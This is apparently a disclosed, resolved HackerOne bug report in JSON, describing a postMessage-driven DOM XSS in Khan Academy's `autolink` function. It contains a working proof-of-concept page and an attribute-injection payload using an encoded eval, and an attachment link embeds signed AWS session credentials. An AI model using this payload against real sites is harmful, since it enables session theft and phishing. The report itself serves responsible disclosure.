@@ -1,0 +1,129 @@
+{
+  "id": 1758132,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzU4MTMy",
+  "url": "https://hackerone.com/reports/1758132",
+  "title": "xss due to incorrect handling of postmessages",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-11-01T23:12:11.183Z",
+  "submitted_at": "2022-11-01T23:12:11.302Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "moom825",
+    "url": "/moom825",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 134,
+    "url": "https://hackerone.com/khanacademy",
+    "handle": "khanacademy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Khan Academy",
+      "twitter_handle": "",
+      "website": "https://www.khanacademy.org/",
+      "about": "Start learning now. Completely free, forever."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-12-23T00:22:55.455Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-11-23T00:22:50.901Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Due to Insecure handling of create link tags (a tags) in a function called `autolink` found in `7Bmt.af733e428f9f986dfc96.js`\n```js\ne = n.autolink(e, !0));\n        const n = function() {\n            const e = /\\b(?:(?:https?:\\/\\/|www\\d{0,3}[.]|[a-z0-9.\\-]+[.][a-z]{2,4}\\/)(?:[^\\s()<>&]+|&amp;|\\((?:[^\\s()<>]|(?:\\([^\\s()<>]+\\)))*\\))+(?:\\((?:[^\\s()<>]|(?:\\([^\\s()<>]+\\)))*\\)|[^\\s`!()\\[\\]{};:'\".,<>?«»“”‘’&]))/gi;\n            return {\n                autolink: function(t, r) {\n                    return t.replace(e, (function(e) {\n                        /^https?:\\/\\//.test(e) || (e = \"http://\" + e);\n                        return \"<a \" + (r ? 'rel=\"nofollow\"' : \"\") + ' href=\"' + e + '\">' + e + \"</a>\"\n                    }\n                    ))\n                }\n            }\n        }();\n```\nwhich is ran in the challenges (ex: https://www.khanacademy.org/computing/computer-programming/programming/resizing-with-variables/pc/challenge-brown-bear-eyes). A specially crafted postmessage can abuse this.\n```html\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"utf-8\">\n        <title>New webpage</title>\n    </head>\n    <body>\n        <script>\n        function main()\n{\n\twindow['test']=window.open(\"https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania\");\n\tconst pwntimer = setTimeout(pwn, 3000);\t\n}\nfunction pwn(){window['test'].postMessage('{\"results\":{\"timestamp\":'+Date.now()+',\"code\":\"\",\"errors\":[],\"assertions\":[],\"warnings\":[],\"tests\":[{\"name\":\"\",\"state\":\"pass\",\"results\":[{\"type\":\"assertion\",\"msg\":\"http://#/\\\\\"style=\\\\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\\\\"onmouseover=\\\\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\\\\"\",\"state\":\"pass\",\"expected\":\"\",\"meta\":{\"structure\":\"function() {pwned!}\"}}]}]}}',\"*\");clearTimeout(pwntimer)};\n        </script>\n        <button onclick=\"main();\">press to pwn</button>\n    </body>\n</html>\n```\nalso due to insecure host checking in the `message` event, the mentioned html code above can be run from any webpage.\n\nThe payload which the function `autolink` is insecurely creating the tag can look like this\n`http://#/\"style=\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\"onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\"` the malicious link will be set incorrectly and create extra attributes (in this case style and onmouseover)\n\n\nthe parsed json payload:\n```json\n{\n   \"results\":{\n      \"timestamp\":\"\",\n      \"code\":\"\",\n      \"errors\":[\n         \n      ],\n      \"assertions\":[\n         \n      ],\n      \"warnings\":[\n         \n      ],\n      \"tests\":[\n         {\n            \"name\":\"\",\n            \"state\":\"pass\",\n            \"results\":[\n               {\n                  \"type\":\"assertion\",\n                  \"msg\":\"http://#/\\\"style=\\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\\"onmouseover=\\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\\"\",\n                  \"state\":\"pass\",\n                  \"expected\":\"\",\n                  \"meta\":{\n                     \"structure\":\"function() {pwned!}\"\n                  }\n               }\n            ]\n         }\n      ]\n   }\n}\n```\n\n## Impact\n\nThis attack could be steal user data (cookies, profile, etc) which in turn can be used to manipulate the user account, if it is a teacher who gets targeted, it can cause havoc with the email (\"106 assignments have been assigned\") as well as leak student private info. This attack could also be used to create a phishing page with the domain `khanacademy.org` by modifying the page to display a login box (stealing the users email and password).",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2014732,
+      "file_name": "poc.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jnf8n7alw2rkxydzoye91lwfos9z?response-content-disposition=attachment%3B%20filename%3D%22poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ47IOYM63%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150839Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDt2pA4ORu3j0CnLrZYnzP7XaKVG5cS2f1fRngACU%2BRxwIhAJl%2B7iyrsT%2FdqYckJm%2Bhwl1NQsxE1ueuI6aZrMAGNEVLKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzHCvj93uC1lWI8jxEqjgXcaT8fA1L7puv03BEbg7O%2FavEjl5VCXCy1JMvsOut%2FATGv02GosQIBWE2YIkJKviW5mg1kja1MqinC1hQ%2F7vXE%2Fjds67JmvLr3ZK8L0jidDBdciEgxht%2Bj7tC5Z6zRSwQxn0mgPH%2BqPNEPtGXc22tmX75lDDll2NPZLkLYaWMTj160Czo3NrAp0%2Fa5rGUWcEy8baUsZt3M0IKccDlq1vt8TrdWsE7i%2B1NcOd3UzU%2BZlUXrUOZQ3Zwz9HTNfYnMSt%2FntJQI42E5g%2BwGGzIb1rElIWUCER7r6x%2BoLu5jkSCXyF2O%2B0TwF223DavlygkX0%2FqR9X5z%2FayyB5MWdk%2FCAtvA8xxvglEvbBQj49rZmF5Pi8wgIm3vuJWM7y%2FxzIKURdCBpXTswKNGbyQOqbw5oS0GLGsXdh8kd9hB0t45msp7laAMVZvqC0juMNMZJGyS3uAcJSfhcI%2BEpihuYegvnXTznkATcGgWY7VXkI2y0Lpw%2B93nHN%2FlHf4zL8PP9HHFUbqi9uiph7w851lZObeobq1d5Lprz5ek1K%2B0iwIpa1QOo%2Blj1PDIqBDT%2F%2FbAHv6DdjaOqiuh2FyM%2B9cn6DrtPT6oxPxcBYJqqw%2BcMdHKf3ievZghquEx1RuSxPgt8b4wkGVrsl3OeZo%2BtRYC4pPa2WqH0T9YOsyA3NSgB0GfmwSWJPtTyc8MY00GJSTesBDzI4IzsEfkTUQH4yOnp8P7nPnlKUpBXQJCyFkEljbujArgtsp2QqSEv%2FdoEQ9lG5XJ5SRAO5DOEAgnlXKUUS00%2BVDZynj8QxF289AAlDmygKWaLmu2KYjHnA%2F8duyKoGHUF5i%2FxGyDnKqDBPSGsAv%2FUxGl6rlTNPt53H7z6NPKAV4wiur8zwY6sAHVoAM%2FsIovelBN3G6gVkybeN69BViaGwJEmuQWnwEWOp3XLL3k%2FbJ3GZ%2FWBYzwxHRLW3Rnhs6LHF%2FRLrXacPt8vRHFfJZHJlJQjccTZrfwOm0w%2Falri2nQaPMkEWsStlHrCspb8v0pIsD8CK2x5GisZz%2BUzx7Bye0X4%2BPuoU3OySBJ4qQEHZ9aMOtl%2FwgsJPLZ48DTccfQN2ytGIUk9xHJnooEFJNHqn2ayiSJGguFZQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7e15dcaac969bf0bb1ce0902692c9cf5bc52ba9063dfecd482c70cfec5ea4091",
+      "file_size": 3709190,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-12-23T00:22:50.962Z",
+  "allow_singular_disclosure_after": -106584348.77807361,
+  "singular_disclosure_allowed": true,
+  "vote_count": 33,
+  "voters": [
+    "mr-medi",
+    "hackcommander",
+    "jumpydata",
+    "similardisaster",
+    "zy9ard3",
+    "shreyaschavhan",
+    "shubham_srt",
+    "mouhannadlrx0",
+    "f_m",
+    "2026",
+    "and 23 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
